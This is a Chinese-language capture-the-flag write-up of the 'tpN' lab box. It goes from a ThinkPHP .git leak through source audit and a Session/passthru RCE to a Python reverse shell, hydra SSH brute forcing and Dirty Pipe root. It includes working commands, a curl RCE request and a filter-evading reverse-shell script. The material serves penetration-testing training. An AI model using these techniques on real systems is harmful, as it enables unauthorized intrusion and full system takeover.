# tpN 靶机复盘：ThinkPHP Git 泄露到 Dirty Pipe

> 本文记录的是隔离环境中的授权靶机复盘。Git 源码还原、命令执行与内核提权验证均不可用于未授权系统。

| 项目 | 本次记录 |
|------|----------|
| 靶机 | tpN |
| 目标地址 | 192.168.134.70 |
| Web | ThinkPHP（8080） |
| 最终路径 | `.git` 泄露 → 代码审计 RCE → www-data → `.pwd` 字典爆破 SSH `welcome` → Dirty Pipe → root |

![环境 / 主机发现](/content/tpn/image-01.png) ![靶机信息](/content/tpn/image-02.png)

## 1. 攻击链概览

入口是 8080 上的 ThinkPHP。目录扫描撞到 `.git`，还原源码后审计出带 Session 的命令执行；进 www-data 后从家目录抠出密码字典，SSH 切到 `welcome`，IRC 后门走不通，最后用内核 Dirty Pipe 到 root。

```text
主机发现 / 扫描 8080
  → dirsearch：.git 泄露
  → git-dumper 还原源码
  → 审计：Token / Admin 相关逻辑 → Session + passthru RCE
  → 反弹 shell（避开 htmlspecialchars 过滤字符）
  → /home/welcome/.pwd 可读字典 → hydra → welcome:eecho
  → IRC 后门（irc_bot.py）不可用
  → 内核 5.8.0 → Dirty Pipe → root
```

## 2. 枚举：8080 与 Git 泄露

![端口 / 服务确认](/content/tpn/image-03.png)

```bash
dirsearch -u http://192.168.134.70:8080
```

![目录扫描命中 .git](/content/tpn/image-04.png)

`.git` 可访问，直接 dump：

```bash
mkdir -p thinkphp_dump
git-dumper http://192.168.134.70:8080/.git ./thinkphp_dump
```

![git-dumper 还原仓库](/content/tpn/image-05.png)
![源码落盘](/content/tpn/image-06.png)

## 3. 代码审计：Session 与命令执行

拿到完整 ThinkPHP 应用后做本地审计。

![审计入口](/content/tpn/image-07.png)
![控制器逻辑](/content/tpn/image-08.png)
![危险调用点](/content/tpn/image-09.png)
![Session 相关](/content/tpn/image-10.png)

搜 Session 写入：

```bash
grep -r 'Session::set'
# app/index/controller/Token.php:            Session::set("sb", $sb);
# app/index/controller/ViewPage1.php://      Session::set("xf","徐峰");
# app/index/controller/ViewPage1.php://      Session::set("user","徐峰");
```

`Token.php` 会把可控内容写进 Session；后续管理相关接口在已有 Cookie / Session 的前提下，能走到以参数为名的回调（本次验证用的是 `passthru`）。

![审计结论 / 利用准备](/content/tpn/image-11.png)
![Session / Cookie](/content/tpn/image-12.png)
![请求构造](/content/tpn/image-13.png)

带上会话 Cookie 验证 RCE：

```bash
curl -b cookies.txt 'http://192.168.134.70:8080/think/Admin/hello?a=id&b=passthru'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 4. 反弹 Shell：绕过 htmlspecialchars

页面侧会对部分字符做 `htmlspecialchars` 一类过滤，经典反弹一行里的 `<>"'` 容易被吃掉。所以改成先写一个**不含这些字符**的 Python 脚本，再经 `passthru` 落盘执行。

![反弹准备](/content/tpn/image-14.png)

```python
#!/usr/bin/env python3
# 靶机 tpN 反弹 shell (www-data)
# 用法: 靶机上执行 python3 /tmp/r.py & ；Kali 端 nc -lvnp 4444
# 说明: 不含 <> " 单引号等被 htmlspecialchars 过滤的字符，可经 RCE 的 passthru 原样写入
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.134.4',4444))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])
```

写入并执行后拿到 www-data shell。

![写入并执行](/content/tpn/image-15.png)

## 5. 横向：`.pwd` 字典爆破 SSH

![家目录线索](/content/tpn/image-16.png)

`/home/welcome/.pwd` 属主是 root，但权限 **644 可读**，里面是一份约 501 条的密码字典，明显在提示 SSH 爆破。

```bash
hydra -l welcome -P rockpy_dict.txt ssh://192.168.134.70 -t 6 -f
# [22][ssh] host: 192.168.134.70 login: welcome password: eecho
```

![SSH 登录 welcome](/content/tpn/image-17.png)

## 6. 提权弯路：IRC 后门打不通

![welcome 下枚举](/content/tpn/image-18.png)

系统里有个可写脚本 `/usr/local/bin/irc_bot.py`。审计看下来是个 IRC 后门，支持远程执行 `more` / `dir` / `busybox` / `whoami` 一类命令。

![irc_bot.py](/content/tpn/image-19.png)
![服务状态](/content/tpn/image-20.png)

实际踩坑：相关服务 **masked（被禁用）**，目标用户 `pycrtlake` 也不存在，后门触发不了。这条线放弃，改打内核。

## 7. 提权：Dirty Pipe（CVE-2022-0847）

```bash
welcome@tpN:~$ uname -a
Linux tpN 5.8.0-050800-generic #202008022230 SMP Sun Aug 2 22:33:21 UTC 2020 x86_64 GNU/Linux
```

`5.8.0` 落在 Dirty Pipe 影响范围内，满足提权条件。

![内核 / 漏洞确认](/content/tpn/image-21.png)

上传 PoC，编译后简单利用：

![上传 PoC](/content/tpn/image-22.png)
![Dirty Pipe 提权成功](/content/tpn/image-23.png)

利用原理（笔记里贴的说明）：

![Dirty Pipe 原理说明](/content/tpn/image-24.png)

Dirty Pipe 的核心是：管道页与 page cache 在特定条件下会共享，向管道写入可以污染只读文件在内存中的缓存页，从而在不改磁盘权限模型的前提下改写 SUID 二进制等内容，最终拿到 root。

## 8. 关键知识点

| 要点 | 复盘结论 |
|------|----------|
| `.git` 泄露 | 有 dump 就能审计；ThinkPHP 路由再绕，源码在手里就透明 |
| Session + 回调 | `Token` 写 Session，管理接口再拿参数当函数名（`passthru`） |
| 过滤绕过 | RCE 出口有 `htmlspecialchars` 时，换「无敏感字符」脚本落盘更稳 |
| 644 字典 | root 所有 ≠ 不可读；`.pwd` 直接喂 hydra |
| 诱饵后门 | 可写 IRC bot 看起来很香，masked / 用户不存在就该及时转向 |
| Dirty Pipe | `5.8.x` 一类内核别只盯 sudo；`uname` 对上公开 LPE 往往更短 |

## 9. 复盘

tpN 前半段是典型的「Git 泄露 → 审计 → Web RCE」，中间用可读字典把身份抬到 `welcome`；提权故意放了 IRC 诱饵，走不通才回到内核。真正收尾的是 **Dirty Pipe**：版本对上了，PoC 一跑就结束。值得记住的是两条习惯——**Web 过滤下优先落干净脚本**，以及 **本机提权枚举别被华丽后门耽误，`uname` 要早看**。
